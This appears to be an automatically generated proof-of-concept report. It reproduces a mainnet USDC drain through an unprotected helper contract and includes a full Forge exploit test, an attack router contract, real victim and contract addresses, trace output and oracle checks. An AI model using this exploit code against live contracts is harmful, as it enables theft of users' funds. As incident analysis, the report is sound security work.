# Helper + Router USDC Drain PoC Report

## 1. Overview & Context

This Proof-of-Concept (PoC) reproduces the ACT opportunity described in the root-cause
analysis for the incident titled:

> "Unauthorized USDC drain via unprotected helper and router".

At a high level, the vulnerability arises because a helper contract on Ethereum mainnet
(`erc20TransferFrom` in `0x43Dc865E916914FD93540461FdE124484FBf8fAa`) can spend arbitrary
USDC allowances without binding caller identity or enforcing access control. A separate
router combines this helper with a Uniswap V3 USDC/WETH pool to drain a victim's USDC and
convert it into ETH profit for an adversary.

The PoC targets the ACT opportunity in `root_cause.json`:
- **Chain**: Ethereum mainnet (forked).
- **Victim**: `0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5`.
- **Helper**: `0x43Dc865E916914FD93540461FdE124484FBf8fAa` (unprotected `erc20TransferFrom`).
- **USDC**: `0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48` (canonical mainnet USDC).
- **WETH**: `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`.
- **Uniswap V3 USDC/WETH pool**: `0xE0554a476A092703abdB3Ef35c80e0D76d32939F`.

Instead of using the real, unverified incident router and attacker EOAs, the PoC uses a
synthetic router contract (`AttackRouterShim`) and synthetic EOAs for the attacker and
router caller. The helper, USDC, WETH, Uniswap V3 pool, and victim remain the real
mainnet contracts on a forked state.

**Command to run the PoC** (from the Forge project root `forge_poc/`):

```bash
forge test --via-ir -vv
```

This runs the main test `ExploitTest.test_Exploit_ReproducesIncidentAndPassesOracle`,
which encodes all oracles from `oracle_definition.json`.

---

## 2. PoC Architecture & Key Contracts

### 2.1 Main Components

The PoC is implemented as a Forge test in `test/Exploit.t.sol`:

```solidity
// Origin: forge_poc/test/Exploit.t.sol (excerpt)
contract ExploitTest is Test {
    // Canonical mainnet addresses from oracle/root cause
    address constant HELPER = 0x43Dc865E916914FD93540461FdE124484FBf8fAa;
    address constant USDC   = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH   = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant UNIV3_POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;
    address constant VICTIM = 0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5;

    // Synthetic EOAs used for the PoC (never real attacker EOAs).
    address attacker;      // receives ETH profit
    address routerCaller;  // unprivileged EOA that calls the router entrypoint

    IERC20 usdc = IERC20(USDC);
    IHelper helper = IHelper(HELPER);
    IUniswapV3Pool pool = IUniswapV3Pool(UNIV3_POOL);
    ...
}
```

**Key roles and contracts**:
- `HELPER`: the real on-chain helper with the vulnerable `erc20TransferFrom` function.
- `USDC`, `WETH`, `UNIV3_POOL`: real mainnet token and pool contracts.
- `VICTIM`: the real victim EOA that granted a large USDC allowance to the helper.
- `attacker`: synthetic EOA (`vm.addr(1)`) that receives ETH profit.
- `routerCaller`: synthetic EOA (`vm.addr(2)`) that calls the router entrypoint.
- `routerShim`: a local `AttackRouterShim` instance that reproduces the incident
  behaviour while remaining self-contained.

### 2.2 AttackRouterShim: Synthetic Router

The synthetic router is a small contract that wires the real helper, USDC, WETH, and
Uniswap V3 pool together in the same pattern as the incident transaction.

```solidity
// Origin: forge_poc/test/Exploit.t.sol (excerpt)
contract AttackRouterShim {
    address public immutable helper;
    address public immutable usdc;
    address public immutable weth;
    address public immutable univ3Pool;
    address public immutable victim;
    address public immutable profitRecipient;

    uint256 public immutable drainAmount;
    uint160 public immutable sqrtPriceLimitX96;

    constructor(
        address helper_,
        address usdc_,
        address weth_,
        address univ3Pool_,
        address victim_,
        address profitRecipient_,
        uint256 drainAmount_,
        uint160 sqrtPriceLimitX96_
    ) {
        helper = helper_;
        usdc = usdc_;
        weth = weth_;
        univ3Pool = univ3Pool_;
        victim = victim_;
        profitRecipient = profitRecipient_;
        drainAmount = drainAmount_;
        sqrtPriceLimitX96 = sqrtPriceLimitX96_;
    }

    function yoink() external payable {
        IHelper(helper).erc20TransferFrom(usdc, address(this), victim, drainAmount);
        IUniswapV3Pool(univ3Pool).swap(
            address(this),
            true,
            int256(drainAmount),
            sqrtPriceLimitX96,
            bytes("")
        );
        uint256 wethBal = IERC20(weth).balanceOf(address(this));
        IWETH(weth).withdraw(wethBal);
        (bool ok, ) = profitRecipient.call{value: address(this).balance}("");
        require(ok, "profit transfer failed");
    }
}
```

**What this demonstrates**:
- The helper is used to spend the victim's USDC allowance without any caller binding.
- Drained USDC flows into the Uniswap V3 pool, is swapped to WETH, then unwrapped to ETH.
- All ETH ends up in the synthetic attacker EOA, matching the exploit predicate.

---

## 3. Adversary Execution Flow

### 3.1 Environment Setup and Funding

The test forks Ethereum mainnet just before the incident block and verifies all
preconditions.

```solidity
// Origin: forge_poc/test/Exploit.t.sol (setUp excerpt)
uint256 constant DRAIN_AMOUNT          = 14_773_350_000;      // from trace.cast.log
uint160 constant SQRT_PRICE_LIMIT_X96  = 4_295_128_740;       // from trace.cast.log
uint256 constant FORK_BLOCK           = 21_019_771;           // block_height_B - 1
uint256 constant ROUTER_MSG_VALUE     = 999;                  // 0x3e7 from seed metadata

function setUp() public {
    vm.createSelectFork("mainnet", FORK_BLOCK);

    attacker = vm.addr(1);
    routerCaller = vm.addr(2);

    routerShim = new AttackRouterShim(
        HELPER,
        USDC,
        WETH,
        UNIV3_POOL,
        VICTIM,
        attacker,
        DRAIN_AMOUNT,
        SQRT_PRICE_LIMIT_X96
    );
    router = address(routerShim);

    vm.label(attacker, "Attacker");
    vm.label(routerCaller, "RouterCaller");
    vm.label(VICTIM, "Victim");
    vm.label(router, "AttackRouterShim");
    vm.label(HELPER, "Helper");
    vm.label(USDC, "USDC");
    vm.label(WETH, "WETH");
    vm.label(UNIV3_POOL, "UniswapV3_USDC_WETH");

    assertGe(usdc.balanceOf(VICTIM), DRAIN_AMOUNT);
    assertGe(usdc.allowance(VICTIM, HELPER), DRAIN_AMOUNT);
    assertGt(HELPER.code.length, 0);
    assertGt(router.code.length, 0);

    deal(attacker, 5 ether);
    assertEq(address(usdc), USDC);
}
```

**Key steps**:
- Fork mainnet at `FORK_BLOCK = 21,019,771`, modelling the pre-incident state
  (`block_height_B - 1` from `root_cause.json`).
- Initialize synthetic EOAs: `attacker` (profit recipient) and `routerCaller`.
- Deploy `AttackRouterShim` wired to the real helper, USDC, WETH, Uniswap pool, and
  victim.
- Label important addresses for trace readability.
- Enforce pre-checks from the oracle: victim USDC balance and allowance, and non-empty
  code for helper and router.
- Fund the synthetic attacker with 5 ETH to pay gas and receive exploit profit.

### 3.2 Exploit Execution

The core exploit is executed via `routerCaller` calling the router shim.

```solidity
// Origin: forge_poc/test/Exploit.t.sol (attack path excerpt)
function reproducerAttack() internal {
    routerShim.yoink{value: ROUTER_MSG_VALUE}();
}

function test_Exploit_ReproducesIncidentAndPassesOracle() public {
    uint256 attackerEthBefore = attacker.balance;
    uint256 victimUsdcBefore = usdc.balanceOf(VICTIM);

    vm.expectEmit(true, true, true, true);
    emit Transfer(VICTIM, router, DRAIN_AMOUNT);

    vm.startPrank(routerCaller);
    reproducerAttack();
    vm.stopPrank();

    uint256 attackerEthAfter = attacker.balance;
    assertGe(attackerEthAfter, attackerEthBefore + 1 ether);

    uint256 victimUsdcAfter = usdc.balanceOf(VICTIM);
    assertGe(victimUsdcBefore - victimUsdcAfter, 1_000_000);
}
```

**Step-by-step adversary flow**:
1. `routerCaller` (unprivileged EOA) calls `routerShim.yoink{value: ROUTER_MSG_VALUE}()`.
2. `AttackRouterShim.yoink()` calls `helper.erc20TransferFrom(USDC, router, VICTIM,
   DRAIN_AMOUNT)`, spending the victim's USDC allowance.
3. The USDC is swapped to WETH on the canonical USDC/WETH Uniswap V3 pool using the
   same notional amount and price limit observed in the trace.
4. WETH is unwrapped to ETH, and the ETH is forwarded to `attacker`.
5. The test asserts that `attacker` gains at least `1 ether` of net ETH and that the
   victim's USDC balance decreases by at least `1 USDC`.

This matches the ACT structure from the root cause:
- **A**: Adversary-crafted router call.
- **C**: Helper-based USDC drain + Uniswap swap logic.
- **T**: Profit realization in ETH for the attacker and depletion of victim USDC.

### 3.3 Profit Realization in the Trace

A snippet from the Forge trace log (validator run) shows ETH flowing to the synthetic
attacker:

```text
// Origin: validator forge-test.log (excerpt)
...
│   ├─ [9198] WETH::withdraw(5577114288719559149 [5.577e18])
│   │   ├─ [58] AttackRouterShim::receive{value: 5577114288719559149}()
│   │   ├─ emit Withdrawal(...)
│   ├─ [0] Attacker::fallback{value: 5577691310267613320}()
│   │   └─ ← [Stop]
...
```

This confirms that WETH is unwrapped and ETH is delivered to the `Attacker` address
(`attacker = vm.addr(1)`).

---

## 4. Oracle Definitions and Checks

The oracle specification in
`artifacts/poc/oracle_generator/oracle_definition.json` defines variables, pre-checks,
AND hard/soft constraints. The PoC treats these as the specification for success.

### 4.1 Variables Mapping

From `oracle_definition.json`:

```json
{
  "variables": [
    { "name": "attacker", "address": null, "role": "Attacker" },
    { "name": "victim", "address": "0x3dadf003afcc96d404041d8ae711b94f8c68c6a5" },
    { "name": "router_contract", "address": "0x6980a47bee930a4584b09ee79ebe46484fbdbdd0" },
    { "name": "helper_contract", "address": "0x43dc865e916914fd93540461fde124484fbf8faa" },
    { "name": "usdc_token", "address": "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48" },
    { "name": "weth_token", "address": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2" },
    { "name": "uniswap_usdc_weth_pool", "address": "0xe0554a476a092703abdb3ef35c80e0d76d32939f" }
  ]
}
```

**Implementation mapping in the PoC**:
- `attacker` → synthetic EOA `attacker = vm.addr(1)`.
- `victim` → `VICTIM = 0x3DADf...c6a5`.
- `router_contract` → synthetic `router = address(routerShim)` that implements the
  same exploit entrypoint semantics as the incident router.
- `helper_contract` → `HELPER = 0x43Dc865E916914FD93540461FdE124484FBf8fAa`.
- `usdc_token` → `USDC` constant, with `IERC20 usdc = IERC20(USDC)`.
- `weth_token` → `WETH` constant.
- `uniswap_usdc_weth_pool` → `UNIV3_POOL` constant.

### 4.2 Pre-checks

The oracle pre-checks require:
- Victim USDC balance ≥ `drainAmount`.
- Victim→helper USDC allowance ≥ `drainAmount`.
- Helper and router have non-empty bytecode.

These are implemented in `setUp()` as:

```solidity
assertGe(usdc.balanceOf(VICTIM), DRAIN_AMOUNT);
assertGe(usdc.allowance(VICTIM, HELPER), DRAIN_AMOUNT);
assertGt(HELPER.code.length, 0);
assertGt(router.code.length, 0);
```

This matches the preconditions of the incident and root cause.

### 4.3 Hard Constraints

The hard constraints ensure correct exploit semantics.

1. **HC1: USDC spent from victim via helper**
   - Specification: helper `erc20TransferFrom` must cause a USDC `Transfer` of
     `drainAmount` from victim to the router-controlled receiver.

   Implementation:

   ```solidity
   vm.expectEmit(true, true, true, true);
   emit Transfer(VICTIM, router, DRAIN_AMOUNT);
   reproducerAttack();
   ```

   The `reproducerAttack()` call triggers `helper.erc20TransferFrom(USDC, router, VICTIM,
   DRAIN_AMOUNT)` inside `AttackRouterShim`, satisfying HC1 as written.

2. **HC2: Asset type is canonical USDC**
   - Specification: the exploit must involve mainnet USDC at the canonical address.

   Implementation (in `setUp()`):

   ```solidity
   assertEq(address(usdc), USDC);
   ```

3. **HC3: Unprivileged router call succeeds**
   - Specification: an unprivileged attacker EOA calling the router exploit entrypoint
     must succeed without revert.

   Implementation:

   ```solidity
   vm.startPrank(routerCaller);
   reproducerAttack();
   vm.stopPrank();
   ```

   `routerCaller` is a synthetic EOA with no special privileges, so the successful call
   shows the entrypoint is effectively permissionless.

### 4.4 Soft Constraints

The soft constraints capture quantitative exploit outcomes.

1. **SC1: Attacker ETH profit**
   - Specification: attacker must gain at least `1 ether` in net ETH, aligning with the
     ~5.46 ETH profit observed in the incident cluster.

   Implementation:

   ```solidity
   uint256 attackerEthBefore = attacker.balance;
   reproducerAttack();
   uint256 attackerEthAfter = attacker.balance;
   assertGe(attackerEthAfter, attackerEthBefore + 1 ether);
   ```

2. **SC2: Victim USDC depletion**
   - Specification: victim's USDC balance must decrease by at least `1 USDC` (1e6
     units), with the real incident draining 14,773.35 USDC.

   Implementation:

   ```solidity
   uint256 victimUsdcBefore = usdc.balanceOf(VICTIM);
   ...
   uint256 victimUsdcAfter = usdc.balanceOf(VICTIM);
   assertGe(victimUsdcBefore - victimUsdcAfter, 1_000_000);
   ```

Together, these oracles ensure the PoC encodes both the permission failure and the
numerically meaningful loss/profit behaviour.

---

## 5. Validation Result and Robustness

The validator re-ran the Forge tests with full tracing:

```bash
cd forge_poc
forge test --via-ir -vvvvv \
  > artifacts/poc/poc_validator/forge-test.log 2>&1
```

All tests passed:

```text
// Origin: forge-test.log (summary)
Suite result: ok. 1 passed; 0 failed; 0 skipped
Ran 1 test suite ... 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The validation result is recorded in
`artifacts/poc/poc_validator/poc_validated_result.json` with:

```json
{
  "overall_status": "Pass",
  "poc_correctness_checks": {
    "passes_validation_oracles": { "passed": true, ... }
  },
  "poc_quality_checks": {
    "oracle_alignment_with_definition": { "passed": true, ... },
    "human_readable_and_labeled": { "passed": true, ... },
    "no_magic_numbers_and_values_are_derived": { "passed": true, ... },
    "self_contained_no_attacker_side_artifacts": { ... all true ... },
    "end_to_end_attack_process_described": { "passed": true, ... },
    "alignment_with_root_cause": { "passed": true, ... }
  }
}
```

**Robustness notes**:
- The PoC uses real mainnet contracts and state for helper, USDC, WETH, Uniswap pool,
  and victim, making it tightly coupled to the actual exploit context.
- Synthetic EOAs and router ensure no dependence on real attacker identities.
- All critical parameters derived from the root cause and seed traces are factored into
  named constants with comments, improving maintainability and auditability.

---

## 6. Linking PoC Behavior to Root Cause

### 6.1 Exercising the Vulnerable Logic

The root cause analysis (`root_cause.json`) describes transaction
`0x7f2540af...e92172` where an adversary-controlled EOA calls a router that:
- Uses helper `0x43dc...fAa` to invoke an unprotected `erc20TransferFrom`.
- Drains 14,773,350,000 USDC from the victim `0x3DAD...c6a5`.
- Swaps USDC for WETH via Uniswap V3 USDC/WETH pool `0xE055...39F`.
- Unwraps WETH to ETH and consolidates ETH profit to an attacker cluster.

The PoC reproduces this logic with synthetic identities:
- `AttackRouterShim.yoink()` calls `helper.erc20TransferFrom(USDC, router, VICTIM,
  DRAIN_AMOUNT)`, exactly capturing the unauthorized spend of the victim's allowance.
- The subsequent `swap` on the canonical Uniswap V3 pool, with `DRAIN_AMOUNT` and
  `SQRT_PRICE_LIMIT_X96` taken from the incident trace, mirrors the path to WETH.
- `WETH.withdraw` and the ETH transfer to `attacker` ensure the same economic effect.

### 6.2 Demonstrating Victim Loss and Attacker Gain

The oracles and assertions connect directly to the exploit predicate in the root
cause (profit in ETH and depletion of victim USDC):
- Victim USDC balance strictly decreases when the helper spends the allowance.
- The synthetic attacker gains at least `1 ether` of net profit, aligning with the
  ~5.46 ETH cluster profit reported in the analysis, while allowing for small
  deviations due to pool state.

### 6.3 ACT Framing and Roles

Under the ACT framework:
- **Adversary action (A)**: `routerCaller = vm.addr(2)` issues a crafted transaction to
  the synthetic router shim (`yoink()`), mirroring the incident adversary-crafted tx to
  the real router.
- **Chain transition (C)**: the helper invokes `erc20TransferFrom`, the Uniswap V3 pool
  processes the swap, and WETH is unwrapped to ETH. These transitions occur entirely on
  the forked mainnet state.
- **Targeted outcome (T)**: the victim loses USDC and the synthetic attacker gains ETH,
  satisfying the profit-based exploit predicate from the root cause.

Overall, the PoC is a faithful, self-contained reproduction of the incident's
vulnerability and exploit path, with all oracles encoded and satisfied, no real
attacker identities, and clear documentation tying each step back to the root cause.
